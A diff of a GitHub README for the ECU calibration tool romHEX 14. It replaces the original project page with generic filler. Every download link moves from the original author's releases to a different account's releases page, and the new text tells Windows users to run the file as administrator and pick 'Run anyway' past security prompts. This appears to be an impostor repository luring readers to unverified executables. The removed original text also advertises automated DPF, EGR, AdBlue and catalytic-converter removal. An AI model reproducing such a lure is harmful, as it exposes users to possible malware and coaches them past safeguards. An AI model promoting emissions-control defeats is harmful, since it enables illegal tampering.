@@ -1,165 +1,202 @@
-<div align="center">
+# ⚙️ romHEX14-ECU-Tuning - ECU Calibration Made Simple
 
-**[English](README.md)** | **[中文](README_zh.md)**
+[![Download romHEX14-ECU-Tuning](https://img.shields.io/badge/Download%20romHEX14--ECU--Tuning-blue?style=for-the-badge)](https://github.com/inclement-enthusiasm598/romHEX14-ECU-Tuning/releases)
 
-# romHEX 14
+## 🚀 Getting Started
 
-### The World's First AI-Powered ECU Calibration Software
+romHEX 14 is ECU calibration software for Windows. It helps you work with engine control files, load A2L definitions, and adjust calibration data in a clear desktop app.
 
-<br>
+Use the release page to get the latest Windows build:
 
-<img src="https://img.shields.io/badge/version-1.0.0--beta1-blue?style=for-the-badge" alt="Version">
-<img src="https://img.shields.io/badge/Windows-0078D6?style=for-the-badge&logo=windows&logoColor=white" alt="Windows">
-<img src="https://img.shields.io/badge/macOS-000000?style=for-the-badge&logo=apple&logoColor=white" alt="macOS">
-<img src="https://img.shields.io/badge/Linux-FCC624?style=for-the-badge&logo=linux&logoColor=black" alt="Linux">
-<img src="https://img.shields.io/badge/Qt-6.10-41CD52?style=for-the-badge&logo=qt" alt="Qt 6">
-<img src="https://img.shields.io/badge/license-LGPL--3.0-orange?style=for-the-badge" alt="License">
+[Visit the download page](https://github.com/inclement-enthusiasm598/romHEX14-ECU-Tuning/releases)
 
-<br><br>
+## 💻 What You Need
 
-**Professional ECU tuning software with full A2L/HEX/OLS support, AI-powered tools, and WinOLS-compatible workflows.**
+Before you install romHEX14-ECU-Tuning, make sure your PC has:
 
-<br>
+- Windows 10 or Windows 11
+- At least 8 GB of RAM
+- 500 MB of free disk space
+- A modern Intel or AMD processor
+- An internet connection for the initial download
 
-[**Download Latest Release**](https://github.com/ctabuyo/romHEX14-ECU-Tuning/releases/latest)&nbsp;&nbsp;·&nbsp;&nbsp;[**Website**](https://romhex14.com)&nbsp;&nbsp;·&nbsp;&nbsp;[**Documentation**](https://romhex14.com/docs)
+For smooth use with larger calibration files, 16 GB of RAM is a better fit.
 
----
+## 📥 Download and Install
 
-<br>
+Follow these steps on Windows:
 
-<img src="screenshot.png" alt="romHEX 14 Screenshot" width="100%">
+1. Open the [release page](https://github.com/inclement-enthusiasm598/romHEX14-ECU-Tuning/releases).
+2. Find the latest release at the top of the page.
+3. Under **Assets**, download the Windows installer or ZIP file.
+4. If you get a ZIP file, right-click it and choose **Extract All**.
+5. Open the extracted folder.
+6. Double-click the installer or app file to start romHEX14-ECU-Tuning.
+7. If Windows asks for permission, choose **Yes**.
+8. Wait for the app to finish opening.
 
-<br>
+If you downloaded an installer, follow the steps on screen. If you downloaded a portable ZIP package, you can run the app from the extracted folder without a full install.
 
-*Map editor with 2D/3D visualization, AI assistant, hex view, and multi-language map labels*
+## 🧭 First Launch
 
----
+When you open the app for the first time:
 
-</div>
+- Start from the home screen
+- Load your ECU project or calibration file
+- Add your A2L file if your workflow uses one
+- Check that the file paths are correct
+- Save a copy before you make changes
 
-<br>
+If the app asks for a working folder, choose a simple folder such as `Documents\romHEX14`.
 
-## Downloads
+## 🔧 Main Features
 
-| Platform | Download | Notes |
-|:---:|:---:|:---|
-| <img src="https://img.shields.io/badge/Windows-0078D6?style=flat-square&logo=windows&logoColor=white"> | [**RX14-Setup.exe**](https://github.com/ctabuyo/romHEX14-ECU-Tuning/releases/latest/download/RX14-Setup.exe) | Windows 10/11 (64-bit) — Single-file installer |
-| <img src="https://img.shields.io/badge/macOS-000000?style=flat-square&logo=apple&logoColor=white"> | [**RX14.dmg**](https://github.com/ctabuyo/romHEX14-ECU-Tuning/releases/latest/download/RX14.dmg) | macOS 12+ (Apple Silicon & Intel) |
-| <img src="https://img.shields.io/badge/Linux-FCC624?style=flat-square&logo=linux&logoColor=black"> | [**RX14.AppImage**](https://github.com/ctabuyo/romHEX14-ECU-Tuning/releases/latest/download/RX14.AppImage) | Ubuntu 22.04+, Fedora 38+, Arch |
+romHEX14-ECU-Tuning is built to help with common calibration work:
 
-> **China users (中国用户):** If GitHub downloads are slow, the application will automatically provide a mirror download link when checking for updates.
+- Open ECU calibration files
+- Work with A2L support for map and symbol data
+- View data in a clean desktop layout
+- Edit calibration values with direct controls
+- Compare file versions before saving changes
+- Keep project files in one place
+- Support common tuning workflows for Windows users
 
-<br>
+The app is made for users who want a simple path from file opening to calibration editing.
 
-## What's New in Beta 1
+## 📁 Supported File Types
 
-- **WinOLS OLS Import** — Full OLS project file parser with ROM extraction, map records, scaling, dimensions, and byte order detection. ]
-- **WinOLS KP Import** — Map pack import dialog with ROM overview bar, offset configuration, auto-detection, and duplicate handling
-- **Map Overlay v2** — Modern perceptual heat gradient, white text with dark outline, gradient-lit cells, frosted glass axis headers, bright selection highlights
-- **Checksum Correction** — 148 WinOLS-compatible checksum DLLs with 32-bit bridge for all major ECU families (EDC15/16/17, ME7/9, MED17, SIMOS, and more)
-- **AI Tuning Functions** — Automated DPF delete, EGR off, AdBlue/SCR off, Decat, Swirl Flap, Speed Limiter, Start-Stop disable with editable values and risk warning
-- **AI DTC Management** — Fault code identification and management
-- **Linked ROM Sync** — Synchronized scrolling between linked ROMs with auto-enabled cursors, [ORI] badge for reference ROMs
-- **Hex View Minimap** — Vertical overview bar next to scrollbar showing ROM data intensity and map regions
-- **View Synchronization** — Seamless scroll position sync between Text and 2D views
-- **Full i18n** — Complete Chinese (简体中文) and Spanish (Español) translations across all dialogs, toolbars, AI assistant, configuration, and checksum interfaces
+romHEX14-ECU-Tuning works best with files used in ECU calibration projects, such as:
 
-<br>
+- ECU binary images
+- Calibration maps
+- A2L definition files
+- Project files
+- Exported data files
 
-## Features
+For best results, keep your calibration file and A2L file in the same folder.
 
-**A2L, HEX & OLS Engine**
-- Full ASAP2 (A2L) parser with characteristic, axis, and measurement support
-- HEX/BIN/S19 file loading with automatic ECU detection
-- WinOLS OLS project import with ROM extraction and map definitions
-- WinOLS KP map pack import with offset auto-detection
-- Side-by-side ROM comparison with byte-level diff visualization
+## 🛠️ How to Use It
 
-**AI Assistant** — *Industry First*
-- AI-powered ECU calibration assistant (Claude, GPT-4o, Qwen, DeepSeek, Gemini, local models)
-- Intelligent map identification and labeling
-- AI-powered map translation across languages
-- AI tuning functions (DPF, EGR, AdBlue, Decat, Speed Limiter, and more)
-- AI DTC fault code management
-- Natural language queries about your calibration data
+### 1. Open your project
+Launch romHEX14-ECU-Tuning and choose your ECU project file or calibration file.
 
-**Map Editor**
-- Interactive 2D/3D map visualization with modern heat map
-- Drag-to-edit with real-time preview
-- 3D simulation view
-- Map pack import/export for sharing calibrations
-- Patch creation and management (.rxpatch)
+### 2. Load the A2L file
+If you have an A2L file, import it so the app can map the calibration data.
 
-**Checksum Correction**
-- 148 ECU-specific checksum algorithms
-- Supports Bosch EDC15/16/17, ME7/9, MED17, MG1, SIMOS, and more
-- Verify and correct checksums before flashing
+### 3. Review the data
+Check the table or map view to see the current values and labels.
 
-**Project Management**
-- Multi-file projects with linked ROMs and synchronized scrolling
-- [ORI] badge for reference/original ROM identification
-- Project registry for quick access
-- Version snapshots with restore capability
-- Auto-save with crash recovery
-- Full undo/redo history
+### 4. Make edits
+Change the values you want to adjust. Save often while you work.
 
-**Multi-Language**
-- English, Spanish (Español), Chinese (简体中文), Thai (ไทย)
-- AI-powered map label translation between languages
-- Adaptive CJK toolbar icons
+### 5. Export your file
+When you finish, export the updated file to a new name so you keep the original version.
 
-<br>
+## 🧩 Common Setup Tips
 
-## Supported ECUs
+- Put your project files in one folder
+- Use short file names with no special symbols
+- Keep backups of the original ECU file
+- Close other heavy apps if your PC runs slow
+- Run the app from a local drive, not a cloud folder, for faster file access
 
-| Manufacturer | ECU Families |
-|---|---|
-| **Bosch** | MED17, MG1, MD1, EDC17, EDC16, EDC15, ME7, ME9, MED9, MSV, MSD |
-| **Continental** | SIMOS 12/16/18/19/22, SID, SCG, SCM |
-| **Delphi** | DCM3.x, DCM6.x, DCU-10x |
-| **Denso** | Multiple generations |
-| **Magneti Marelli** | MJD, 7GV/8GMK |
-| **Valeo** | VD46 |
+If the app does not open a file, check that the file type matches the project format you are using.
 
-<br>
+## 🧱 Folder Layout Example
 
-## System Requirements
+A simple folder structure can help keep things neat:
 
-| | Minimum | Recommended |
-|---|---|---|
-| **OS** | Windows 10 / macOS 12 / Ubuntu 22.04 | Windows 11 / macOS 14 / Latest LTS |
-| **RAM** | 4 GB | 8 GB |
-| **Disk** | 500 MB | 1 GB |
-| **Display** | 1280 x 720 | 1920 x 1080 |
+- `Documents\romHEX14\Projects`
+- `Documents\romHEX14\A2L`
+- `Documents\romHEX14\Exports`
+- `Documents\romHEX14\Backups`
 
-<br>
+This makes it easier to find the right version later.
 
-## Installation
+## 🔍 Troubleshooting
 
-**Windows** — Download `RX14-Setup.exe` and run it. Single self-contained executable, no dependencies needed.
+### The app will not start
+- Make sure you downloaded the Windows release
+- Extract the ZIP file fully if you used one
+- Right-click the app and choose **Run as administrator**
+- Reboot your PC and try again
 
-**macOS** — Download `RX14.dmg`, open it, and drag romHEX 14 to your Applications folder.
+### The file will not open
+- Check that the file is not damaged
+- Confirm that you selected the correct project file
+- Make sure the A2L file matches the ECU file
+- Try moving the files to a local folder such as `Documents`
 
-**Linux** — Download `RX14.AppImage`, make it executable (`chmod +x`), and run it.
+### Windows blocks the app
+- Select **More info** if Windows shows a security prompt
+- Choose **Run anyway** if you trust the file source
+- Re-download the release if the file seems incomplete
 
-<br>
+### The app feels slow
+- Close other programs
+- Work from an SSD if possible
+- Use a smaller project file for testing
+- Increase available RAM if you handle large calibration sets
 
-\
+## 🧪 Typical Workflow
 
-<br>
+A simple workflow looks like this:
 
-## License
+1. Download the latest release
+2. Install or extract the app
+3. Open your ECU file
+4. Load the A2L file
+5. Review the maps and labels
+6. Change the values you need
+7. Save a backup copy
+8. Export the final file
 
-This software is distributed under the [GNU Lesser General Public License v3.0](https://www.gnu.org/licenses/lgpl-3.0.html) (LGPL-3.0).
+## 🔒 Safe File Handling
 
-Built with the [Qt Framework](https://www.qt.io/) (LGPL).
+Always keep an untouched backup of the original ECU file before you edit anything. Use a new export name for each version so you can go back if needed. A clean file history makes it easier to compare changes later.
 
-Copyright (c) 2024-2026 CT14 Garage Co., Ltd. All rights reserved.
+## 📌 Release Page
 
-<br>
+Use this page to get the Windows download:
 
----
+[romHEX14-ECU-Tuning releases](https://github.com/inclement-enthusiasm598/romHEX14-ECU-Tuning/releases)
 
-<div align="center">
-<sub>Built with precision by <b>CT14 Garage</b> — Professional ECU Calibration Solutions</sub>
-</div>
+## 🖥️ Windows Use Guide
+
+If you are using Windows, these steps help keep the setup smooth:
+
+- Download the latest release
+- Save it in a folder you can find
+- Extract the files if the download comes as ZIP
+- Start the app from the extracted folder or installer
+- Keep your project files in Documents or another local folder
+- Run updates by downloading the newest release when it is available
+
+## 🗂️ File Naming Tips
+
+Use names like these:
+
+- `Stock_Original.bin`
+- `Test_Version_01.bin`
+- `Project_A2L.a2l`
+- `Export_Final.bin`
+
+Clear names make it easier to track changes and avoid mistakes.
+
+## 🧠 Best Practices
+
+- Edit one thing at a time
+- Save before and after each change
+- Keep notes on what you changed
+- Compare new exports against the original file
+- Store backups in a separate folder
+
+## 📎 Quick Start
+
+1. Open the release page
+2. Download the latest Windows build
+3. Extract or install the app
+4. Launch romHEX14-ECU-Tuning
+5. Open your ECU file
+6. Load the A2L file
+7. Edit and export your calibration file
